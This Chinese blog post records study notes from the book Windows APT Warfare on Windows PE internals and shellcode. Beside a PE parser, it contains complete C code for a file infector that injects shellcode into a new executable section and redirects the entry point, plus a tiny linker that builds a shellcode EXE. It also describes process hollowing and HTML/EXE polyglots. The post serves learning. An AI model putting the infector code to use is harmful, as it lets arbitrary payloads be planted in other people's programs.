---
title: shellcode初探
date: 2024-04-25 19:29:25
tags: 
  - APT
  - shellcode
categories:
  - APT
  - 恶意代码
description: 参考Windows APT Varface学习的理解与贯通
cover: ../img/lao_shu.jpg
---

> 本文源码全来自于Windows APT Varface,之前做过一次但未得其技术原理，学以贯通，再来啃一次

# 函数劫持

可以知道一个函数由三个部分组成

`int printf(const char *,...);`

返回值，函数指针，以及参数，在调用函数时我们只需要知道函数指针就可以对其完成使用，所以会有两个点需要完成

+ 获得函数指针，也就是函数实现的起始地址，我们可以使用GetProcAddress()和LoadlibaryA()函数获得地址和引入函数位于的模块（dll库），例如`GetProcAddress( LoadLibraryA("USER32.dll"), "MessageBoxA" );`

+ 存放函数指针的空间，可以使用typedef对原函数类型取别名，获得一个函数指针变量

  > 函数指针的typedef和普通变量使用方法有所区别
  >
  > `typedef int(*out)(const char *,...);`

以printf函数为例有：

```c++
#include<stdio.h>
typedef int(*out)(const char *,...);
int main(){
long long a =(long long)printf;//因为现在电脑多为x86,64位，所以不能使用int
printf("%x\n",a); //printf不需要装载是因为他是标准函数库中函数,在编译时已经被链接到程序
out b =(out)a;
b("addr:%p",b);//%p,表示类型为指针.
    return 0;
}
```

MessageBox函数：

```c++
#include <stdio.h>
#include <windows.h>
typedef int(WINAPI* def_MessageBoxA)(HWND, char*, char*, UINT);

int main(void) {
    
    size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA("USER32.dll"), "MessageBoxA" );
    printf("[+] imp_MessageBoxA: %p\n", MessageBoxA);
    printf("[+] get_MessageBoxA: %p\n", get_MessageBoxA);

    def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;
    msgbox_a(0, "hi there", "info", 0);
    return 0;
}
```

> 这里printf和MessageBoxA都是在编译中就被链接进了程序所以不需要GetProcAddress可以直接使用，但对于其他windows API和c标准库的需要通过GetprocAddress绑定具体函数地址，事实上，这就是动态链接库的延迟绑定机制

![image-20240418233500990](https://raw.githubusercontent.com/WowOnWall/Drawing-bed/main/image-20240418233500990.png)

# 内存映射

<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src="https://raw.githubusercontent.com/WowOnWall/Drawing-bed/main/image-20240418234001405.png">
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">PE未加载前结构</div>
</center>


## PE_Parser

![image-20240418235328062](https://raw.githubusercontent.com/WowOnWall/Drawing-bed/main/image-20240418235328062.png)

<center>
    PE被加载进入内存
    </center>


> 这是一个查看PE文件结构的脚本

```c
#include"stdio.h"
#include"windows.h"
#pragma warning(disable:4996) //vs中关闭危险函数报警，这里我用vsc编译注释掉也可以正常运行

//读取二进制文件
bool readBinFile(const char fileName[], char*& bufPtr, DWORD& length) {
	if (FILE* fp = fopen(fileName, "rb")) {
		fseek(fp, 0, SEEK_END); //从函数末尾计算偏移量并移动函数指针给它
		length = ftell(fp); //获取函数指针位置，为了获得文件长度
		bufPtr = new char[length + 1];
        
		fseek(fp, 0, SEEK_SET);
		fread(bufPtr, sizeof(char), length, fp);
		return true;
	}
	else return false; //文件打开失败退出
}


//对读取的二进制文本进行结构化定义
void peParser(char* ptrToPeBinary) {
	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER *)ptrToPeBinary; //获取bin dos头区域
	IMAGE_NT_HEADERS* ntHdrs = (IMAGE_NT_HEADERS *)((size_t)dosHdr + dosHdr->e_lfanew);//通过dos头定位文件头
	if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
		puts("[!] PE binary broken or invalid?");
		return;
	}   //判断关键签名是否为PE的关键字

	// 打印可选头关键信息
	if (auto optHdr = &ntHdrs->OptionalHeader) {
		printf("[+] ImageBase prefer @ %p\n", optHdr->ImageBase); //载入内存偏移
		printf("[+] Dynamic Memory Usage: %x bytes.\n", optHdr->SizeOfImage); //需要分配最小内存
		printf("[+] Dynamic EntryPoint @ %p\n", optHdr->ImageBase + optHdr->AddressOfEntryPoint); //main入口
	}

	// 节区头信息读取
	puts("[+] Section Info");
	IMAGE_SECTION_HEADER* sectHdr = (IMAGE_SECTION_HEADER *)((size_t)ntHdrs + sizeof(*ntHdrs));//第一个节区指针
	for (size_t i = 0; i < ntHdrs->FileHeader.NumberOfSections; i++)
		printf("\t#%.2x - %8s - %.8x - %.8x \n", i, sectHdr[i].Name, sectHdr[i].PointerToRawData, sectHdr[i].SizeOfRawData);
}   //节区头名，在文件中起始位置，节区对应模块实际大小
int main(int argc, char** argv){
    char* binaryData; DWORD binarySize;
	if (argc != 2)
		puts("[!] usage: peParser.exe [path/to/exe]");
	else if (readBinFile(argv[1], binaryData, binarySize)) {
		printf("[+] try to parse PE binary @ %s\n", argv[1]);
		peParser(binaryData);
	}
	else puts("[!] read file failure.");
    return 0;
}
```

+ 编译的时候可能gcc可能会因为new函数而找不到合适链接器，可以使用g++或者gcc添加指定链接器`-lstdc++`
+ 文件为cmd传参

## PE_Patcher

> 在文件上新加恶意代码区段，并加入op前执行

```c
#include"iostream"
#include"windows.h"

#pragma warning(disable:4996)
//对常用表达式进行取别名：文件头，段地址，对齐+1代表始终多分配一个对齐位
#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)-0x10)) //减10是因为使用参数文件为32为，但电脑为64位，可选头结构会大10 
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align)) //向上对齐

//需要注入shellcode码,意思是弹出broken byte的弹窗
char x86_nullfree_msgbox[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

//读取文件二进制码
bool readBinFile(const char *filename,char **bufPtr,DWORD &length){
    if(FILE* fp=fopen(filename,"rb")){
        fseek(fp,0,SEEK_END);
        length =ftell(fp);
        *bufPtr =new char[length +1]; //char **为二级指针，经常用来表示指向一个字符串数组
        fseek(fp,0,SEEK_SET);
        fread(*bufPtr,sizeof(char),length,fp);
        return true;
    }
    else
    return false;

}

int main(int argc,char** argv){
    /*   前期条件判断  */
    if (argc != 2) {    //判断是否传参
            puts("[!] usage: ./PE_Patcher.exe [path/to/file]");
            return 0;
        }

	char* buff; DWORD fileSize;
	if (!readBinFile(argv[1], &buff, fileSize)) {   //文件是否被读取成功
		puts("[!] selected file not found.");
		return 0;
	}

    /* 计算最终所需内存空间*/
    puts("[+] malloc memory for outputed *.exe file.");
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
		fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
		finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign);
	char* outBuf = (char*)malloc(finalOutSize);
	memcpy(outBuf, buff, fileSize);

    /*向outBuf填充section内容*/
    puts("[+] create a new section to store shellcode.");
	//auto sectArr = getSectionArr(outBuf);
	IMAGE_SECTION_HEADER*  sectArr = getSectionArr(outBuf); 
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;
	memcpy(newSectionHdr->Name, "30cm.tw", 8); //对新加段头写入相关信息
	newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign);
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
	newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;

    /*写入shellcode*/
    puts("[+] pack x86 shellcode into new section.");
	memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));
   
    /*重新计算VA地址，可能旧编译器没设置好，重新修复一下*/
    puts("[+] repair virtual size. (consider *.exe built by old compiler)");
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;
    
    /*和上面一样修复映射的内存大小*/
    puts("[+] fix image size in memory.");
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage = //最后一个区块地址加上区块大小
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
    /*设置EP为shellcode*/
    puts("[+] point EP to shellcode.");
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

    /*重命名和将缓存区文件写入硬盘*/
    char outputPath[MAX_PATH];
	memcpy(outputPath, argv[1], sizeof(outputPath));
	strcpy(strrchr(outputPath, '.'), "_infected.exe");
	FILE* fp = fopen(outputPath, "wb");
	fwrite(outBuf, 1, finalOutSize, fp);
	fclose(fp);

	printf("[+] file saved at %s\n", outputPath);
	puts("[+] done.");
    return 0;
}
```

这里在因为可选头大小的缘故调试了很久才能运行，由于加载的重写文件为32位，但他识别的结构体为64位，导致识别的段错开了0x10字节，32位可选头位0xe0,64位为0xf0

## TinyLinker

> 前面为在已有exe程序寄生，那可不可以直接产生一个新的呢

```c++
/**
 * Tiny Linker
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)
#define file_align 0x200
#define sect_align 0x1000

#define P2ALIGNUP(size, align) ((((size) / align) + 1) * (align))

char x86_nullfree_msgbox[] =
	"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
	"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
	"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
	"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
	"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
	"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
	"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
	"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

int main() {
	size_t peHeaderSize = P2ALIGNUP(sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER), file_align);
	size_t sectionDataSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), file_align);
	char *peData = (char *)calloc(peHeaderSize + sectionDataSize, 1);

	// 填充dos数据，只需要填充标识和文件头地址
	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)peData;
	dosHdr->e_magic = IMAGE_DOS_SIGNATURE; // MZ
	dosHdr->e_lfanew = sizeof(IMAGE_DOS_HEADER);

	// 填充文件头
	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(peData + dosHdr->e_lfanew);
	ntHdr->Signature = IMAGE_NT_SIGNATURE; // PE
	ntHdr->FileHeader.Machine = IMAGE_FILE_MACHINE_I386;
	ntHdr->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE;
	ntHdr->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER);
	ntHdr->FileHeader.NumberOfSections = 1;

	// Section
	PIMAGE_SECTION_HEADER sectHdr = (PIMAGE_SECTION_HEADER)((char *)ntHdr + sizeof(IMAGE_NT_HEADERS));
	memcpy(&(sectHdr->Name), "30cm.tw", 8);
	sectHdr->VirtualAddress = 0x1000;
	sectHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sect_align);
	sectHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
	sectHdr->PointerToRawData = peHeaderSize;
	memcpy(peData + peHeaderSize, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));
	sectHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	
    /*设置可选头*/
    ntHdr->OptionalHeader.AddressOfEntryPoint = sectHdr->VirtualAddress; //代码执行地址
	ntHdr->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR32_MAGIC; //文件类型标识
	ntHdr->OptionalHeader.BaseOfCode = sectHdr->VirtualAddress; // .text RVA
	//ntHdr->OptionalHeader.BaseOfData = 0x0000;                  // .data RVA 只存在32位结构
	ntHdr->OptionalHeader.ImageBase = 0x400000;
	ntHdr->OptionalHeader.FileAlignment = file_align;
	ntHdr->OptionalHeader.SectionAlignment = sect_align;
	ntHdr->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI; //子系统
	ntHdr->OptionalHeader.SizeOfImage = sectHdr->VirtualAddress + sectHdr->Misc.VirtualSize; //程序加载+段大小
	ntHdr->OptionalHeader.SizeOfHeaders = peHeaderSize; //所有头的大小
	ntHdr->OptionalHeader.MajorSubsystemVersion = 5;    //操作系统相关
	ntHdr->OptionalHeader.MinorSubsystemVersion = 1;


	FILE *fp = fopen("poc.exe", "wb");
	fwrite(peData, peHeaderSize + sectionDataSize, 1, fp);
}
```

## Process Hollowing

> 进程镂空，或又被叫做傀儡进程，属于进程注入的一种，上面的都是作用于文件，这个用于内存。

![image-20240420201423255](https://raw.githubusercontent.com/WowOnWall/Drawing-bed/main/image-20240420201423255.png)

代码有点不对劲，原理很容易理解，但在权限和内存分配方面有一些报错，看之后能不能改好再贴上来吧..

## HTML2EXE

> 原理是利用exe文件没有用到的字节，填充对应html代码，并通过<!--!>符注释掉exe用到的二进制码，cmd运行时并不会检测后缀名，所以即使后缀名为html也可以正常运行从而实现两者共存

[原作者](https://osandamalith.com/2020/07/19/hacking-the-world-with-html/#more-3943)

# shellcode编写